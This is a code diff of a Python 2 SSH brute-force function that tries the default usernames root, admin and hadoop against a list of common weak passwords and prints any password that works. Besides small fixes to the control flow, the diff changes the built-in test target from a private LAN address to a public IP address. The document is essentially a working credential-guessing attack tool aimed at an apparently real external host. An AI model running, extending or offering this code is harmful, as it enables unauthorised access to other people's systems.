@@ -10,8 +10,8 @@ def ssh2(ip='',port='22',name='',productname=''):
 
     ssh=None
     userlist=['root','admin','hadoop']
-    passwd=['hadoop','root','123456','admin','','12345','111111','password','123123','1234','12345678','123456789','696969',
-            'abc123','qwerty','oracle']
+    passwd=['root','123456','admin','','12345','111111','password','123123','1234','12345678','123456789','696969',
+            'abc123','qwerty','oracle','hadoop']
     msg='1'
     for  username in  userlist:
         for i in passwd:
@@ -24,7 +24,7 @@ def ssh2(ip='',port='22',name='',productname=''):
                 hackinfo= ' ssh the password is :'+i
                 print ip+hackinfo
                 keywords='ssh'
-                break;
+                break
             except Exception,e:
                 keywords='ssh'
                 hackinfo=str(e)
@@ -44,6 +44,7 @@ def ssh2(ip='',port='22',name='',productname=''):
                 if e[0] in 'Authentication failed.':
                     continue
                 else:
+                    msg = None
                     break
             finally:
                 if ssh !=None:
@@ -53,6 +54,6 @@ def ssh2(ip='',port='22',name='',productname=''):
             break
     return head,ans,keywords,hackinfo
 if __name__ == "__main__":
-    temp=ssh2('192.168.1.142')
+    temp=ssh2('202.118.48.122')
     print temp
     
